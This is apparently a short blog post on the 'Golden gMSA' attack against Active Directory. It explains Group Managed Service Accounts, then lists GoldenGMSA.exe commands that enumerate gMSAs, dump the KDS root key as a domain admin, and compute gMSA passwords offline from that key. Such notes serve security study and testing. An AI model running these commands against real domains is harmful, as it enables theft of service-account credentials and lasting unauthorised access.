---
layout: post
date: 26/11/2022
author: Aswin Gopalakrishnan
title:  Golden GMSA
---

A gMSA (Group Managed Service Account) is a special type of account in Active Directory (AD) designed to provide automatic password management and simplified service principal name (SPN) management for services running on multiple servers. Introduced in Windows Server 2012, gMSAs are used to run services and tasks securely without the need for manual password management. The passwords for gMSAs are automatically rotated and managed by AD, making them more secure and reducing administrative overhead

1. Enumerate all gMSA
```bash
GoldenGMSA.exe gmsainfo
GoldenGMSA.exe gmsainfo --sid S-1-5-21-1437000690-1664695696-1586295871-1112
```
2. As a domain admin
```bash
GoldenGMSA.exe kdsinfo
GoldenGMSA.exe kdsinfo --guid 46e5b8b9-ca57-01e6-e8b9-fbb267e4adeb
```
3. Offline Compute
```bash
GoldenGMSA.exe compute --sid S-1-5-21-1437000690-1664695696-1586295871-1112 --kdskey AQAAA(snipped)m45
```